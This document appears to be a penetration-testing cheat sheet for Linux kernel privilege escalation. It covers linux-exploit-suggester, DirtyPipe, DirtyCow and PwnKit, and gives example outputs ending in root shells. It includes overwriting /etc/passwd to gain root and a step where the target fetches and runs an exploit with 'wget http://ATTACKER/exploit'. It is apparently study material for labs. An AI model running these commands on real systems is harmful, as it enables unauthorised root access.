# KERNEL EXPLOITS

### Check kernel version

Exact kernel version — Search for matching exploits

```bash
uname -r
```

<details>
<summary>Example Output</summary>

```
uname -r
4.15.0-20-generic

Search: 'linux kernel 4.15.0-20 exploit'
Results: DirtyCow, various local privesc
(Match exact version to exploits)
```
</details>

---

### linux-exploit-suggester

Automated kernel exploit finder — Suggests matching CVEs

```bash
./linux-exploit-suggester.sh
or: ./les.sh
```

<details>
<summary>Example Output</summary>

```
./linux-exploit-suggester.sh
[+] CVE-2021-4034 (PwnKit)
  Versions: ALL
  Confidence: Highly probable
[+] CVE-2022-0847 (DirtyPipe)
  Versions: 5.8 - 5.16.11
[+] CVE-2016-5195 (DirtyCow)
  Versions: 2.6.22 - 4.8.3
```
</details>

---

### DirtyPipe (CVE-2022-0847)

Overwrite read-only files — Very reliable

```bash
Kernel 5.8 - 5.16.11
```

<details>
<summary>Example Output</summary>

```
uname -r: 5.13.0-39-generic (VULNERABLE)

./dirtypipe /etc/passwd 1 '${root::0:0:root:/root:/bin/bash}'

su root (no password)
# whoami
root
```
</details>

---

### DirtyCow (CVE-2016-5195)

Race condition write to read-only — Older but still seen in labs

```bash
Kernel 2.6.22 - 4.8.3
```

<details>
<summary>Example Output</summary>

```
uname -r: 4.4.0-21-generic (VULNERABLE)

gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword

su firefart
Password: newpassword
# whoami
root (as firefart user with UID 0)
```
</details>

---

### PwnKit (CVE-2021-4034)

Polkit local privesc — Almost always works if pkexec exists

```bash
pkexec on most Linux distros
```

<details>
<summary>Example Output</summary>

```
which pkexec && pkexec --version
pkexec version 0.105

./PwnKit
# whoami
root
(Works on almost all Linux distros with polkit installed)
```
</details>

---

### Compile on target or cross-compile

Match architecture (x86/x64) — Static compile avoids library issues

```bash
gcc exploit.c -o exploit
or compile on attacker: gcc -static -m32 exploit.c -o exploit
```

<details>
<summary>Example Output</summary>

```
On target:
gcc exploit.c -o exploit
./exploit

OR cross-compile on attacker:
gcc -static -m64 exploit.c -o exploit
python3 -m http.server 80

On target:
wget http://ATTACKER/exploit
chmod +x exploit && ./exploit
```
</details>

---
